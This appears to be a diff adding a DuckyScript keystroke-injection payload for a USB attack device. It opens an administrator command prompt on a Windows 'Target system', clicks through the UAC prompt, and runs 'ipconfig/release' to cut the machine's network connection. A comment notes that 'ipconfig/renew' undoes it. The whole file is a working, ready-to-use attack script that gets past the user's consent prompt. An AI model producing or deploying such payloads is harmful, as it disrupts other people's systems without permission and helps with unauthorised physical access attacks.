@@ -1,0 +1,22 @@
+REM "ipconfig/release" stopps Internet traffic to the Target system.
+REM To fix this, type "ipconfig/renew".
+REM Seconds: 7.95
+DELAY 1000
+GUI r
+DELAY 750
+STRING cmd.exe
+CTRL-SHIFT ENTER
+DELAY 200
+LEFTARROW
+ENTER
+DELAY 1000
+STRING ipconfig/release
+ENTER
+DELAY 1000
+STRING Done.
+DELAY 1000
+DELAY 1000
+DELAY 1000
+DELAY 1000
+STRING exit
+ENTER
